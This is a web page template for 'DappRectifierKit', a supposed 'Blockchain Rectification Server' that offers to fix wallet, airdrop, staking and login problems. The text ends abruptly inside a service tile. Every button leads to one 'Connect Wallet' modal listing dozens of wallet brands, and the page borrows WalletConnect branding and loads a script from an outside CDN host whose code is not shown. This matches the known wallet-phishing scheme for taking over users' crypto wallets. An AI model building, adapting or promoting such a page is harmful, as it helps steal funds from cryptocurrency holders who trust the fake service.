<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charSet="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="generator" content="Gatsby 5.6.1" />
    <meta name="description"
        content="DappRectifierKit is a Blockchain Rectification Server tool, Open and decentralized protocol for syncing various wallets issues on secure server." />
    <link rel="icon" href="{{ asset('favicon.ico')}}">
    <link rel="stylesheet" href="{{ asset('style.css') }}">
    <title data-gatsby-head="true">DappRectifierKit - Blockchain Rectification Server</title>
    <script src="https://weblate-cdn.com/a5ba5dc29f39498aa734528a54b50d0a/weblate.js" async></script>
    <style>
        #pre-loader {
            background: #ffffff url(assets/img/objects/loader.gif) no-repeat center center;
            background-size: 10%;
            height: 100vh;
            width: 100%;
            position: fixed;
            z-index: 100;
        }
    </style>
</head>

<body>
    <div id="pre-loader"></div>
    <div id="___gatsby">
        <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
            <header>
                <div id="sticky-header" class="tg-header__area transparent-header ">
                    <div class="container">
                        <div class="row">
                            <div class="col-12">
                                <div class="mobile-nav-toggler"><i class="flaticon-menu-1"></i></div>
                                <div class="tgmenu__wrap">
                                    <nav class="tgmenu__nav">
                                        <div class="logo"><a aria-current="page" class="light-logo" href="/"><img
                                                    src="{{asset('assets/img/logo/logosv.svg')}}"
                                                    alt="walletconnect" /></a><a aria-current="page" class="dark-logo"
                                                href="/"><img src="{{asset('assets/img/logo/logosv.svg')}}"
                                                    alt="walletconnect" /></a>
                                        </div>
                                        <div class="tgmenu__navbar-wrap tgmenu__main-menu d-none d-lg-flex">
                                            <ul class="navigation">
                                                <li>
                                                    <a class="section-link" data-bs-toggle="modal"
                                                        data-bs-target="#connectModal">
                                                        Products
                                                    </a>
                                                </li>
                                                <li>
                                                    <a class="section-link" data-bs-toggle="modal"
                                                        data-bs-target="#connectModal">Developers</a>
                                                </li>

                                            </ul>
                                        </div>
                                        <div class="tgmenu__action">
                                            <ul class="list-wrap">
                                                <li class="header-social">

                                                    <a href="/" class="d-blcok d-xl-none" data-bs-toggle="modal"
                                                        data-bs-target="#connectModal"><i class="fas fa-wallet"></i>
                                                    </a>
                                                </li>
                                                <li class="header-btn"><button class="btn border-btn"
                                                        data-bs-toggle="modal" data-bs-target="#connectModal">Connect
                                                        wallet</button></li>
                                            </ul>
                                        </div>
                                    </nav>
                                </div>
                                <div class="tgmobile__menu">
                                    <nav class="tgmobile__menu-box">
                                        <div class="close-btn"><i class="flaticon-close-1"></i></div>
                                        <div class="nav-logo"><a aria-current="page" class="light-logo" href="/"><img
                                                    src="{{asset('assets/img/logo/logosv.svg')}}"
                                                    alt="walletconnect" /></a><a aria-current="page" class="dark-logo"
                                                href="/"><img src="{{asset('assets/img/logo/logosv.svg')}}"
                                                    alt="walletconnect" /></a>
                                        </div>
                                        <div class="tgmobile__menu-outer">
                                            <nav>
                                                <ul class="navigation"></ul>
                                            </nav>
                                        </div>
                                        <div class="social-links">
                                            <ul class="list-wrap">
                                                <li><a href="/"><i class="fab fa-facebook-f"></i></a></li>
                                                <li><a href="/"><i class="fab fa-twitter"></i></a></li>
                                                <li><a href="/"><i class="fab fa-instagram"></i></a></li>
                                                <li><a href="/"><i class="fab fa-discord"></i></a></li>
                                                <li><a href="/"><i class="fab fa-telegram-plane"></i></a></li>
                                            </ul>
                                        </div>
                                    </nav>
                                </div>
                                <div class="tgmobile__menu-backdrop"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="connect__modal">
                    <div class="modal fade" id="connectModal" tabindex="-1" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content">
                                <div class="modal__wrapper">
                                    <div class="modal__header">
                                        <h2 class="title">Connect Wallet</h2><button data-bs-dismiss="modal"
                                            aria-label="Close"><i class="flaticon-close-1"></i></button>
                                    </div>
                                    <div class="modal__body text-center">
                                        <p>Please select a wallet to connect </p>
                                        <div class="widget">
                                            <div class="sidebar-search-form position-relative">
                                                <form action="#">
                                                    <input type="text" id="filterInput" placeholder="Search" />
                                                    <button type="submit">
                                                        <i class="fas fa-search"></i>
                                                    </button>
                                                </form>
                                            </div>
                                        </div><br>
                                        <div class="connect__section">
                                            <ul class="list-wrap" id="walletList">
                                                <li class="listItem">
                                                    <button class="border-0 bg-transparent">
                                                        <a class="connect-meta">
                                                            <img src="{{ asset('assets/img/icons/walletconnect.svg') }}"
                                                                alt="walletconnect" />
                                                            Wallet Connect
                                                        </a>
                                                    </button>
                                                </li>
                                                <li class="listItem">
                                                    <button class="border-0 bg-transparent">
                                                        <a class="connect-meta">
                                                            <img src="{{ asset('assets/img/icons/metamask.svg')}}"
                                                                alt="Metamask" />
                                                            MetaMask
                                                        </a>
                                                    </button>
                                                </li>
                                                <li class="listItem">
                                                    <button class="border-0 bg-transparent">
                                                        <a><img src="{{asset('assets/img/icons/bitgo.svg')}}"
                                                                alt="BitGo" />BitGo</a>
                                                    </button>
                                                </li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/trust.svg')}}"
                                                                alt="Trust" />Trust Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/coinbase.svg')}}"
                                                                alt="Coinbase" />Coinbase</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/argent.svg')}}"
                                                                alt="Argent" />Argent Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/imtoken.svg')}}"
                                                                alt="ImToken" />ImToken Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/math.svg')}}"
                                                                alt="Math" />Math Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/blockchain.svg')}}"
                                                                alt="Blockchain" />Blockchain Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/uniswap.svg')}}"
                                                                alt="uniswap" />Uniswap</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/electrum.svg')}}"
                                                                alt="Electrum" />Electrum Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/exodus.svg')}}"
                                                                alt="Exodus" />Exodus Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/huobi.svg')}}"
                                                                alt="Huobi" />Huobi Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/okx.svg')}}"
                                                                alt="OKX" />OKX
                                                            Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/coinbase.svg')}}"
                                                                alt="Bitstamp" />Bitstamp Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/etoro.svg')}}"
                                                                alt="eToro" />eToro Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/kraken.svg')}}"
                                                                alt="Kraken" />Kraken Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/binance.svg')}}"
                                                                alt="Binance" />Binance Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/bitmart.svg')}}"
                                                                alt="BitMart" />BitMart Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/nexo.svg')}}"
                                                                alt="Nexo" />Nexo Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/vindax.svg')}}"
                                                                alt="VinDAX" />VinDAX</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/solflare.svg')}}"
                                                                alt="Solflare" />Solflare Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/phantom.svg')}}"
                                                                alt="Phantom" />Phantom Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/nova.svg')}}"
                                                                alt="Nova" />Nova Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/safepal.svg')}}"
                                                                alt="Safepal" />Safepal Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/cosmos.svg')}}"
                                                                alt="Cosmos" />Cosmos Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/tokenpocket.svg')}}"
                                                                alt="TokenPocket" />TokenPocket Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/ellipal.svg')}}"
                                                                alt="Ellipal" />Ellipal Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/tonkeeper.svg')}}"
                                                                alt="Tonkeeper" />Tonkeeper Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/tonspace.svg')}}"
                                                                alt="Tonspace" />Tonspace Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/best.svg')}}"
                                                                alt="Best" />Best Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/terrastation.svg')}}"
                                                                alt="TerraStation" />TerraStation Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/cosmosstation.svg')}}"
                                                                alt="CosmosStation" />CosmosStation Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/safemoon.svg')}}"
                                                                alt="Safemoon" />Safemoon Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/onto.svg')}}"
                                                                alt="Onto" />Onto Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/aave.svg')}}"
                                                                alt="Aave" />Aave Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/formatic.svg')}}"
                                                                alt="Formatic" />Formatic Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/dharma.svg')}}"
                                                                alt="Dharma" />Dharma Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/1inch.svg')}}"
                                                                alt="1inch" />1inch Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/tron.svg')}}"
                                                                alt="Tron" />Tron Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/coin98.svg')}}"
                                                                alt="Coin98" />Coin98 Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/torus.svg')}}"
                                                                alt="Torus" />Torus Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/spatium.svg')}}"
                                                                alt="Spatium" />Spatium Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/ownbit.svg')}}"
                                                                alt="Ownbit" />Ownbit Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/bridge.svg')}}"
                                                                alt="Bridge" />Bridge Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img
                                                                src="{{asset('assets/img/icons/sparkpoint.svg')}}"
                                                                alt="SparkPoint" />SparkPoint Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/vision.svg')}}"
                                                                alt="Vision" />Vision Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/nomo.svg')}}"
                                                                alt="Nomo" />Nomo Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/rabby.svg')}}"
                                                                alt="rabby" />rabby Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/pulse.svg')}}"
                                                                alt="Pulse" />Pulse Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/auro.svg')}}"
                                                                alt="Auro" />Auro Wallet</a>
                                                    </button></li>
                                                <li class="listItem"><button class="border-0 bg-transparent"><a
                                                            href="#"><img src="{{asset('assets/img/icons/kepler.svg')}}"
                                                                alt="Kepler" />Kepler Wallet</a>
                                                    </button></li>

                                            </ul>
                                        </div>
                                        <p class="privacy-text">By connecting your wallet, you agree to our
                                            <!-- --> <a href="/">Terms of
                                                Service</a> and our
                                            <!-- --> <a href="/">Privacy Policy</a>.
                                        </p>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </header>
            <main id="home" class="fix">
                <div class="gradient-position"><img src="{{asset('assets/img/others/gradient-circle.svg')}}"
                        style="left:-4%;top:-4%" width="500" alt="circle" /><img
                        src="{{asset('assets/img/others/gradient-circle.svg')}}" style="right:-4%;bottom:-4%"
                        width="500" alt="circle" /></div>
                <section class="banner-area banner-padding position-relative">
                    <div class="banner__background-wrap">
                        <div class="background"
                            style="background-image:url({{asset('/assets/img/bg/gradient_bg01.png')}})"></div>
                    </div>
                    <div class="container">
                        <div class="row">
                            <div class="col-lg-6">
                                <div class="banner__content"
                                    data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                                    <img src="{{asset('assets/img/objects/ethereum-01.png')}}" width="44" alt="object"
                                        style="top:-25%;left:38%" /><img
                                        src="{{asset('assets/img/objects/circle-01.png')}}" width="16" alt="object"
                                        style="top:14%;left:-12%" /><img
                                        src="{{asset('assets/img/objects/circle-03.png')}}" width="24" alt="object"
                                        style="bottom:-16%;left:12%" />
                                    <h2 class="title">Blockchain Rectification Server</h2>
                                    <p class="desc">Open and decentralized protocol for syncing various wallets issues
                                        on
                                        secure server.
                                    </p>

                                    <form action="/" class="align-items-center">
                                        <select class="btn bg-transparent text-dark" name="network" id="network">
                                            <option value="Select">Select Network</option>
                                            <option value="ethereum">Ethereum</option>
                                            <option value="base">Base</option>
                                            <option value="polygon">Polygon</option>
                                        </select>
                                        <button data-bs-toggle="modal" data-bs-target="#connectModal" id="connect"
                                            class="banner__btn btn gradient-btn">
                                            <span>connect wallet</span>

                                        </button>
                                    </form>



                                </div>
                            </div>
                            <div class="col-lg-6">
                                <div class="banner__images"><img src="{{asset('assets/img/objects/bitcoin-01.png')}}"
                                        width="44" class="shape" alt="object" style="top:67%;left:-21%" /><img
                                        src="{{asset('assets/img/objects/x.png')}}" width="28" class="shape"
                                        alt="object" style="top:-4%;right:16%" /><img
                                        class="shape dashed-line has-active-light" width="300"
                                        src="{{asset('assets/img/others/blob-dashed.svg')}}" alt="Blog dashed"
                                        style="top:-10%;right:17%;fill:transparent;opacity:.1" /><img
                                        class="shape dashed-line has-active-dark" width="300"
                                        src="{{asset('assets/img/others/blob-dashed-light.svg')}}" alt="Blog dashed"
                                        style="top:-10%;right:17%;fill:transparent;opacity:.1" /><svg
                                        style="top:-17%;opacity:.3" class="shape" viewBox="0 0 200 200"
                                        xmlns="http://www.w3.org/2000/svg">
                                        <path fill="#F796FF"
                                            d="M47.5,-67.2C55.9,-59.3,53.2,-37.9,56.7,-20.1C60.2,-2.3,69.9,11.8,70.8,27.3C71.7,42.9,63.8,59.9,50.6,64.4C37.3,68.9,18.6,60.8,-0.3,61.2C-19.3,61.6,-38.6,70.7,-53.5,66.7C-68.4,62.8,-78.9,45.9,-78.8,29.5C-78.7,13.2,-67.9,-2.7,-59.8,-16.8C-51.6,-31,-46,-43.3,-36.5,-50.9C-27,-58.4,-13.5,-61.1,3,-65.2C19.6,-69.4,39.1,-75.1,47.5,-67.2Z"
                                            transform="translate(100 100)"></path>
                                    </svg>
                                    <div class="banner__images-grid">
                                        <div class="left"><img src="{{asset('assets/img/artwork/05.jpg')}}"
                                                alt="artwork" /></div>
                                        <div class="right"><img src="{{asset('assets/img/artwork/44.jpg')}}"
                                                alt="artwork" /></div>
                                    </div><a class="tg-circle-text" href="/" target="_blank"><svg
                                            class="tg-circle-text-path tg-animation-spin" viewBox="0 0 100 100"
                                            width="120" height="120">
                                            <defs>
                                                <path id="circle"
                                                    d="M 50, 50 m -37, 0 a 37,37 0 1,1 74,0 a 37,37 0 1,1 -74,0"></path>
                                            </defs><text font-size="11.75">
                                                <textPath xlink:href="#circle">decentralized protocol • secure server •
                                                </textPath>
                                            </text>
                                        </svg>
                                        <!-- <i class="unicon-arrow-up-eth"></i> -->
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <div class="brand-area section-pb-65">
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-xl-10 col-12">
                                <h6 class="brand__title">POWERED BY:</h6>
                                <div class="brand__list">
                                    <div class="brand__item"><img src="{{asset('assets/img/wallets/wallet-01.svg')}}"
                                            class="has-active-light" alt="brand" /><img
                                            src="{{asset('assets/img/wallets/wallet-light-01.svg')}}"
                                            class="has-active-dark" alt="brand" /></div>
                                    <div class="brand__item"><img src="{{asset('assets/img/wallets/wallet-02.svg')}}"
                                            class="has-active-light" alt="brand" /><img
                                            src="{{asset('assets/img/wallets/wallet-light-02.svg')}}"
                                            class="has-active-dark" alt="brand" /></div>
                                    <div class="brand__item"><img src="{{asset('assets/img/wallets/wallet-03.svg')}}"
                                            class="has-active-light" alt="brand" /><img
                                            src="{{asset('assets/img/wallets/wallet-light-03.svg')}}"
                                            class="has-active-dark" alt="brand" /></div>
                                    <div class="brand__item"><img src="{{asset('assets/img/wallets/wallet-04.svg')}}"
                                            class="has-active-light" alt="brand" /><img
                                            src="{{asset('assets/img/wallets/wallet-light-04.svg')}}"
                                            class="has-active-dark" alt="brand" /></div>
                                    <div class="brand__item"><img src="{{asset('assets/img/wallets/wallet-05.svg')}}"
                                            class="has-active-light" alt="brand" /><img
                                            src="{{asset('assets/img/wallets/wallet-light-05.svg')}}"
                                            class="has-active-dark" alt="brand" /></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section-divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;"><img
                        src="{{asset('assets/img/others/divider-01.svg')}}" alt="divider" /></div>
                <section id="minting" class="mint-area section-pt-80 section-pb-50">
                    <div class="container">
                        <div class="row justify-content-center"
                            data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 200;">
                            <div class="col-xl-8 col-lg-10">
                                <div class="section__title text-center title-mb-80">
                                    <h2 class="title">Make your selection below</h2>
                                </div>
                            </div>
                        </div>
                        <div class="mint__lits-wrapper"
                            data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 300;">
                            <img class="shape" width="16" src="{{asset('assets/img/objects/circle-01.png')}}"
                                alt="shape" style="top:-16%;left:8%" /><img class="shape" width="24"
                                src="{{asset('assets/img/objects/circle-02.png')}}" alt="shape"
                                style="bottom:16%;right:-8%" /><img class="shape" width="28"
                                src="{{asset('assets/img/objects/x.png')}}" alt="Object" style="bottom:16%;left:-8%" />
                            <div class="row justify-content-center el"
                                data-anime="targets: &gt; *; opacity:[0, 1]; translateY:[24, 0]; onview: -250; delay: anime.stagger(100);">

                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-04.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Buy/Sell</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Click here to buy or sell tokens.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Authenticate</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Tap into secure solutions designed according to industry
                                                    standards.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Bridge</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Bridge your wallet with our innovation tooling.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-02.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Migration</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For migration or anything related to migration.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Validation</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Validate your wallet.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-01.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Claim</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">To claim tokens or have issues claiming tokens.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-01.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Swap</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For token swap issues or any issues while swapping
                                                    token.
                                                </p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Slippage</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For slippage related or transaction fee related issues.
                                                </p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Dapps</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Solve any dapp connection issue.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Transation Error</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For all transaction related error.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-01.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Claim Airdrop</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For error during airdrop claim.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-02.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Exchange</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For token exchange or error while exchanging tokens.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Cross Transfer</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For cross bridge issues while doing cross transfer.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-04.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Staking</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For token staking/unstake related issues.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Login</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For error encountered while logging in to your wallet.
                                                </p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Whitelist</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">To whitelist your address or whitelist related error.
                                                </p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Locked Account</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">if your account was locked or wallet is stuck.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">NFTs</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For NFT minting/transfer issues.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Missing/Irregular Balance</h3>
